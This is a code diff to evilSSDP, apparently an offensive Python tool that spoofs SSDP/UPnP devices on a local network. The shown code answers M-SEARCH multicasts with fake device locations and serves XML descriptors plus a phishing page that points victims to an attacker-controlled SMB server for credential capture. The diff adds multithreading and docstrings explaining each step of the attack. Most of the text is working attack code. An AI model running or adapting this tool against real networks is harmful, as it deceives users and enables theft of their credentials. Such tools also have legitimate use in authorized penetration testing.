@@ -3,6 +3,8 @@
 from multiprocessing import Process
 from string import Template
 from http.server import BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
+from http.server import HTTPServer
 from email.utils import formatdate
 from time import sleep
 from ipaddress import ip_address
@@ -43,7 +45,6 @@ parser.add_argument('-t', '--template', type=str, help='Name of a folder in the 
                      Defaults to "password-vault". This will determine xml and phishing pages used."', action='store')
 parser.add_argument('-s', '--smb', type=str, help='IP address of your SMB server. Defalts to the \
                      primary address of the "interface" provided.', action='store')
-
 args = parser.parse_args()
 
 interface = args.interface
@@ -62,6 +63,11 @@ else:
 
 
 class SSDPListener:
+    """
+    This class object will bind to the SSDP-spec defined multicast address and port. We can then receive data from
+    this object, which will be capturing the UDP multicast traffic on a local network. Processing is handled in
+    the main() function below.
+    """
     def __init__(self, localIp, localPort):
         self.sock = None
         self.knownHosts = []
@@ -88,7 +94,23 @@ class SSDPListener:
             socket.IP_ADD_MEMBERSHIP,
             mreq)
 
+class MultiThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    """
+    Setting up this definition allows us to serve multiple HTTP requests in parallel.
+    Without this, a client device may hang the HTTP server, blocking other devices from properly accessing and
+    parsing the XML files.
+    """
+    pass
+
 def MakeHTTPClass(deviceXML, serviceXML, phishPage):
+    """
+    The class below is being built inside a function to allow us to easily pass variables to built-in functions.
+    This will build a multi-threaded HTTP server listening for specific requests for the XML files we are serving.
+    Any requests to the HTTP server other than the two XML files below will be given the phishing page.
+
+    The phishing page the devices SHOULD be requesting is 'present.html' but we will serve it to all requests,
+    in case a curious users sees the reference and browses there manually.
+    """
     class DeviceDescriptor(BaseHTTPRequestHandler):
         def do_GET(self):
             localIp,localPort = self.server.server_address
@@ -109,6 +131,11 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
                 self.wfile.write(phishPage.encode())
     
         def log_message(self, format, *args):
+            """
+            Overwriting the built in function to provide useful feedback inside the text UI.
+            Providing the 'User Agent' is helpful in understanding the types of devices that are interacting
+            with evilSSDP.
+            """
             address = self.address_string()
             headers = self.headers['user-agent']
             verb = self.command
@@ -123,15 +150,23 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
     return DeviceDescriptor 
 
 def get_ip():
+    """
+    This function will attempt to automatically get the IP address of the provided interface.
+    This is used for serving the XML files and also for the SMB pointer, if not specified.
+    """
     try:
         localIp = re.findall(r'inet (.*?)/', os.popen('ip addr show ' + interface).read())[0]
-        broadcast = re.findall(r'brd (.*?) ', os.popen('ip addr show ' + interface).read())[0]
     except Exception:
         print(warnBox + "Could not get network interface info. Please check and try again.")
         sys.exit()
     return localIp
 
 def set_smb():
+    """
+    This function sets the IP address of the SMB server that will be used in the phishing page.
+    evilSSDP does not provide an SMB server itself - it only points somewhere. You must host your own SMB
+    server with something like Impacket.
+    """
     if args.smb:
         if ip_address(args.smb):
             smbServer = args.smb
@@ -143,6 +178,16 @@ def set_smb():
     return(smbServer)
 
 def process_data(listener, data, address):
+    """
+    This function parses the raw data received on the SSDPListener class object. If the M-SEARCH header is found,
+    it will look for the specific 'Service Type' (ST) being requested and call the function to reply back, telling
+    the client that we have the device type they are looking for.
+
+    If it can't extract the ST, it will reply back with a generic 'ssdp:all' device type and hope for the best.
+
+    The function will log the first time a client does a specific type of M-SEARCH, but after that it will be silent.
+    This keeps the output more readable, as clients can get chatty.
+    """
     (remoteIp,remotePort) = address
     if 'M-SEARCH' in str(data):
         try:
@@ -155,6 +200,13 @@ def process_data(listener, data, address):
         send_location(listener, address, requestedST)
 
 def send_location(listener, address, requestedST):
+    """
+    This function replies back to clients letting them know where they can access more information about our device.
+    The key here is the 'LOCATION' header and the 'ST' header.
+
+    When a client receives this information back on the port they initiated a discover from, they will go to that
+    location and parse the XML file.
+    """
     URL = 'http://{}:{}/ssdp/device-desc.xml'.format(localIp, localPort)
     lastSeen = str(time.time())
     dateFormat = formatdate(timeval=None, localtime=False, usegmt=True)
@@ -173,6 +225,9 @@ def send_location(listener, address, requestedST):
     listener.sock.sendto(reply, address)
 
 def buildDeviceXML():
+    """
+    Builds the device descriptor XML file.
+    """
     variables = {'localIp': localIp,
 		 'localPort': localPort}
     fileIn = open(templateDir + '/device.xml')
@@ -181,6 +236,9 @@ def buildDeviceXML():
     return xmlFile
 
 def buildServiceXML():
+    """
+    Builds the service descriptor XML file. ***Not yet implemented in evilSSDP***
+    """
     variables = {'localIp': localIp,
 		 'localPort': localPort}
     fileIn = open(templateDir + '/service.xml')
@@ -189,6 +247,9 @@ def buildServiceXML():
     return xmlFile
 
 def buildPhish(smbServer):
+    """
+    Builds the phishing page served when users open up an evil device.
+    """
     variables = {'smbServer': smbServer}
     fileIn = open(templateDir + '/present.html')
     template = Template(fileIn.read())
@@ -196,9 +257,12 @@ def buildPhish(smbServer):
     return phishPage
 
 def serve_html(deviceXML, serviceXML, phishPage):
+    """
+    Starts the web server for delivering XML files and the phishing page.
+    """
     HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage)
     socketserver.TCPServer.allow_reuse_address = True
-    descriptor = socketserver.TCPServer((localIp, localPort), HTTPClass)
+    descriptor = MultiThreadedHTTPServer((localIp, localPort), HTTPClass)
     descriptor.serve_forever()
 
 def print_details(smbServer):
@@ -213,6 +277,9 @@ def print_details(smbServer):
     print("\n\n")
 
 def listen_msearch():
+    """
+    Starts the listener object, receiving and processing UDP multicasts.
+    """
     listener = SSDPListener(localIp, localPort)
     while True:
         data, address = listener.sock.recvfrom(1024)
